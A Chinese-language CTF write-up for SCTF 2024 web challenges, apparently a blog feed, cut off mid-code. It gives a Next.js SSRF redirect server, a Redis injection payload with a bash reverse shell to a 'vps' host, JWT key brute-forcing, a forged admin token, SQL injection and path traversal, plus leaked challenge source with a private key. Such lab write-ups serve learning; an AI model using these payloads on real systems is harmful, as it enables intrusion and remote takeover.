<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>STF2024 Web&amp;Misc 复现</title>
      <link href="/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-%E5%A4%8D%E7%8E%B0/"/>
      <url>/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h2><p>参考链接：</p><p><a href="https://cloud.tencent.com/developer/article/2434587">【网络安全】「漏洞复现」（五）从 NextJS SSRF 漏洞看 Host 头滥用所带来的危害</a></p><p><a href="https://blog.csdn.net/m0_73512445/article/details/134740916#:~:text=%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%98%AF%E6%8C%87%E5%B0%86%E4%B8%80%E5%8F%B0R">Redis主从复制实现RCE</a></p><p><a href="https://blog.csdn.net/Jayjay___/article/details/140319709#:~:text=CVE-2024-1">CVE-2024-34351 漏洞复现</a></p><p>首先跑去搜索文章，找到<a href="https://cloud.tencent.com/developer/article/2434587">【网络安全】「漏洞复现」（五）从 NextJS SSRF 漏洞看 Host 头滥用所带来的危害</a>发现和我抓包<strong>back to home</strong>界面极其相似从而得知是<strong>NextJS SSRF 漏洞</strong>，也就是<strong>CVE-2024-34351</strong>，由Next.js异步函数<strong>createRedirectRenderResult</strong>导致的SSRF。</p><p><img src="/hack3r0pium/SCTF/1.png" alt="pic"></p><p>同时docker-compose.yml给出了内网ip</p><p><img src="/hack3r0pium/SCTF/2.png" alt="pic"></p><p>题目源码中的重定向代码：</p><p><img src="/hack3r0pium/SCTF/3.png" alt="pic"></p><p>SSRF验证：</p><p>脚本：exp.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># CORS preflight check</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;HEAD&#x27;</span>:</span><br><span class="line">        response = Response()</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/x-component&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="comment"># after CORS preflight check</span></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        ssrfUrl = <span class="string">&#x27;http://172.11.0.3:5000/&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(ssrfUrl)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1717</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>执行：</p><p><img src="/hack3r0pium/SCTF/4.png" alt="pic"></p><p>成功！</p><p>存在WAF：</p><p><img src="/hack3r0pium/SCTF/5.png" alt="pic"></p><p>可以字符串逃逸，多余的字符就用来payloload逃逸</p><p>然后直接ssrf payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /success HTTP/1.1</span><br><span class="line">Host: vps:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/x-component</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: http://192.168.193.141:3000/success</span><br><span class="line">Next-Action: b421a453a66309ec62a2d2049d51250ee55f10fd</span><br><span class="line">Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22success%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------332929687741145380582296740589</span><br><span class="line">Content-Length: 336</span><br><span class="line">Origin: http://vps:port</span><br><span class="line">Connection: close</span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line">-----------------------------332929687741145380582296740589</span><br><span class="line">Content-Disposition: form-data; name=&quot;1_$ACTION_ID_b421a453a66309ec62a2d2049d51250ee55f10fd&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------332929687741145380582296740589</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line"></span><br><span class="line">[&quot;$K1&quot;]</span><br><span class="line">-----------------------------332929687741145380582296740589--</span><br></pre></td></tr></table></figure><p>最后就是主从复制RCE，要用到的工具是<a href="https://github.com/Dliv3/redis-rogue-server">redis-rogue-server</a></p><p>vps界面一：工具命令：</p><p><code>python3 redis-rogue-server.py --server-only --lhost vps --lport 监听的port</code></p><p><img src="/hack3r0pium/SCTF/6.png" alt="pic"></p><p>主从同步能够看到回显，所以会一直同步</p><p>vps界面二：执行脚本</p><p><code>python3 exp2.py</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, Response, redirect</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/play&#x27;)</span><br><span class="line">def exploit():</span><br><span class="line">    # CORS preflight check</span><br><span class="line">    if request.method == &#x27;HEAD&#x27;:</span><br><span class="line">        response = Response()</span><br><span class="line">        response.headers[&#x27;Content-Type&#x27;] = &#x27;text/x-component&#x27;</span><br><span class="line">        return response</span><br><span class="line">    # after CORS preflight check</span><br><span class="line">    elif request.method == &#x27;GET&#x27;:</span><br><span class="line">        payload=&quot;\r\n$3\r\npun\r\n&quot;#闭合set命令</span><br><span class="line">        #按照下面的命令逐一来</span><br><span class="line">        payload+=&quot;config set dir /tmp\r\n&quot;</span><br><span class="line">        # payload+=&quot;config set dbfilename exp.so\r\n&quot;</span><br><span class="line">        # payload+=&quot;slaveof vps 恶意redis的port也就是工具中的port\r\n&quot;</span><br><span class="line">        # payload+=&quot;module load /tmp/exp.so&quot;</span><br><span class="line">        payload+=&quot;system.exec &#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/反弹shell的port 0&gt;&amp;1\&quot;&#x27;\r\n&quot;</span><br><span class="line">        exp=&quot;admin&quot;*len(payload)+payload</span><br><span class="line">        ssrfUrl = f&#x27;http://172.11.0.3:5000/login?username=&#123;quote(exp)&#125;&amp;&amp;password=1&#x27;</span><br><span class="line">        return redirect(ssrfUrl)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=1717, debug=True)</span><br></pre></td></tr></table></figure><p><img src="/hack3r0pium/SCTF/7.png" alt="pic"></p><p>bp返回数据：</p><p><img src="/hack3r0pium/SCTF/8.png" alt="pic"></p><p>vps界面三：改脚本</p><p><img src="/hack3r0pium/SCTF/9.jpg" alt="pic"></p><p>vps界面四：nc监听</p><p>命令：<code>nc -lvp 监听的端口</code></p><p>最后成功连接redis，拿到flag</p><p><img src="/hack3r0pium/SCTF/10.png" alt="pic"></p><h2 id="ezjump-1"><a href="#ezjump-1" class="headerlink" title="ezjump"></a>ezjump</h2><p>根据提示：ulimit -n &#x3D;2048 cat &#x2F;etc&#x2F;timezone : UTC</p><p><img src="/hack3r0pium/SCTF/11.png" alt="pic"></p><p>注册脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot; http://1.95.87.193:23710&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">    res=requests.post(url+<span class="string">&#x27;/register&#x27;</span>,json=data)</span><br><span class="line">    <span class="keyword">if</span>  res.text==<span class="string">&quot;OK&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;注册成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(res.status_code)+<span class="string">&quot;注册失败&quot;</span>+res.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;username&quot;</span>:username,<span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">    res=requests.post(url+<span class="string">&#x27;/login&#x27;</span>,json=data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>][<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(res.status_code)+<span class="string">&quot;登录失败&quot;</span>+res.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">import</span> json</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        infor = json.loads(base64.b64decode(token).decode())</span><br><span class="line">        <span class="built_in">print</span>(infor[<span class="string">&quot;secret&quot;</span>])</span><br><span class="line">        secret = infor[<span class="string">&quot;secret&quot;</span>]</span><br><span class="line">        secret_key = <span class="built_in">int</span>(<span class="built_in">str</span>(time.time())[<span class="number">0</span>:<span class="number">10</span>])</span><br><span class="line">        <span class="built_in">print</span>(secret_key)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(secret_key - <span class="number">300</span>, secret_key + <span class="number">300</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                key = <span class="built_in">str</span>(i)</span><br><span class="line">                data = jwt.decode(secret, key, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;成功验证: &quot;</span>, data)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, secret_key)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Token已过期&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;无效的Token&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解码失败:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_and_login</span>(<span class="params">i</span>):</span><br><span class="line">    a = <span class="string">&#x27;userm&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">if</span> register(a, a):</span><br><span class="line">        token = login(a, a)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="keyword">return</span> a,a,token  <span class="comment"># 返回账号、密码和登录的 token</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_concurrent_tasks</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2080</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        result=register_and_login(i)</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">2028</span>):</span><br><span class="line">            check(result[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run_concurrent_tasks()</span><br></pre></td></tr></table></figure><p><img src="/hack3r0pium/SCTF/12.png" alt="pic"></p><p>生成token脚本，输入我们的key，账号密码都是userm2079</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> json</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> hashlib</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> base64</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> jwt</span></span><br><span class="line"><span class="function">from app <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function">from User <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">generateToken</span><span class="params">(user)</span>:</span></span><br><span class="line"><span class="function">    secret =</span> &#123;<span class="string">&quot;name&quot;</span>: user, <span class="string">&quot;is_admin&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    verify_c = jwt.<span class="built_in">encode</span>(secret, secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    infor = &#123;<span class="string">&quot;name&quot;</span>: user, <span class="string">&quot;secret&quot;</span>: verify_c&#125;</span><br><span class="line">    token = base<span class="number">64.</span><span class="built_in">b64encode</span>(json.<span class="built_in">dumps</span>(infor).<span class="built_in">encode</span>()).<span class="built_in">decode</span>()</span><br><span class="line">    <span class="built_in">print</span>(infor)</span><br><span class="line">    <span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line">secret_key = <span class="string">&quot;1727882325&quot;</span></span><br><span class="line"><span class="built_in">generateToken</span>(<span class="string">&#x27;userm2079&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/hack3r0pium/SCTF/13.png" alt="pic"></p><p>然后就是删除用户的脚本，不然卡死，登录不了userm2079</p><p><img src="/hack3r0pium/SCTF/14.png" alt="pic"></p><p><img src="/hack3r0pium/SCTF/15.png" alt="pic"></p><p>成功登录</p><p>最后就是生成flask内存马脚本</p><p>参考链接：</p><p><a href="https://blog.wm-team.cn/index.php/archives/82/#ezRender">SCTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p><p><img src="/hack3r0pium/SCTF/16.png" alt="pic"></p><p>或者直接用战队wp的内存马直接发包，链接：<a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-18">SCTF 2024 Writeup</a></p><p><img src="/hack3r0pium/SCTF/17.png" alt="pic"></p><h2 id="SycServer2-0"><a href="#SycServer2-0" class="headerlink" title="SycServer2.0"></a>SycServer2.0</h2><p>f12</p><p><img src="/hack3r0pium/SCTF/18.png" alt="pic"></p><p>控制台输入</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">wafsql = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改掉waf，然后登录：账号<code>admin</code> 密码<code>&#39;or 1=1#</code></p><p>成功登录</p><p><img src="/hack3r0pium/SCTF/19.png" alt="pic"></p><p>robots.txt得到&#x2F;ExP0rtApi?v&#x3D;static&amp;f&#x3D;1.jpeg</p><p>然后目录穿越：<a href="http://1.95.87.154:39435/ExP0rtApi?v=static&f=..././..././..././..././..././..././/app/app.js">http://1.95.87.154:39435/ExP0rtApi?v=static&amp;f=..././..././..././..././..././..././/app/app.js</a></p><p><img src="/hack3r0pium/SCTF/20.png" alt="pic"></p><p>然后使用gzip解码，得到</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nodeRsa = <span class="built_in">require</span>(<span class="string">&#x27;node-rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> handle = <span class="built_in">require</span>(<span class="string">&#x27;./handle&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> con = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">user</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;ctf123123&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">    <span class="attr">database</span>: <span class="string">&#x27;sctf&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">con.<span class="title function_">connect</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(con.<span class="title function_">connect</span>(), <span class="number">2000</span>); <span class="comment">// 2秒后重试连接</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected to MySQL&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;response&#125; = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> req = <span class="built_in">require</span>(<span class="string">&quot;express/lib/request&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(&#123; <span class="attr">b</span>: <span class="number">1024</span> &#125;);</span><br><span class="line">key.<span class="title function_">setOptions</span>(&#123; <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicPem = <span class="string">`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`</span>;</span><br><span class="line"><span class="keyword">var</span> privatePem = <span class="string">`-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span></span><br><span class="line"><span class="string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span></span><br><span class="line"><span class="string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span></span><br><span class="line"><span class="string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span></span><br><span class="line"><span class="string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span></span><br><span class="line"><span class="string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span></span><br><span class="line"><span class="string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span></span><br><span class="line"><span class="string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span></span><br><span class="line"><span class="string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span></span><br><span class="line"><span class="string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span></span><br><span class="line"><span class="string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span></span><br><span class="line"><span class="string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span></span><br><span class="line"><span class="string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span></span><br><span class="line"><span class="string">xu/vfQ0A1jHRNC7t</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Reportcache</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyAdmin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;No token provided&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">SECRET_KEY</span>, <span class="function">(<span class="params">err, decoded</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Failed to authenticate token&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (decoded.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        req.<span class="property">user</span> = decoded;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">publicKey</span>: publicPem,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> pem = privatePem;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(pem, &#123;</span><br><span class="line">            <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span>,</span><br><span class="line">            <span class="attr">b</span>: <span class="number">1024</span></span><br><span class="line">        &#125;);</span><br><span class="line">        key.<span class="title function_">setOptions</span>(&#123; <span class="attr">environment</span>: <span class="string">&quot;browser&quot;</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span> key.<span class="title function_">decrypt</span>(body, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;decrypt error&quot;</span>, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> encryptedPassword = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        passwd = <span class="title function_">decrypt</span>(encryptedPassword)</span><br><span class="line">        <span class="keyword">if</span>(username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> sql = <span class="string">`select (select password from user where username = &#x27;admin&#x27;) = &#x27;<span class="subst">$&#123;passwd&#125;</span>&#x27;;`</span></span><br><span class="line">            con.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(err.<span class="property">message</span>);</span><br><span class="line">                <span class="keyword">if</span> (rows[<span class="number">0</span>][<span class="title class_">Object</span>.<span class="title function_">keys</span>(rows[<span class="number">0</span>])]) &#123;</span><br><span class="line">                    <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;username, <span class="attr">role</span>: username&#125;, <span class="variable constant_">SECRET_KEY</span>, &#123;<span class="attr">expiresIn</span>: <span class="string">&#x27;1h&#x27;</span>&#125;);</span><br><span class="line">                    res.<span class="title function_">cookie</span>(<span 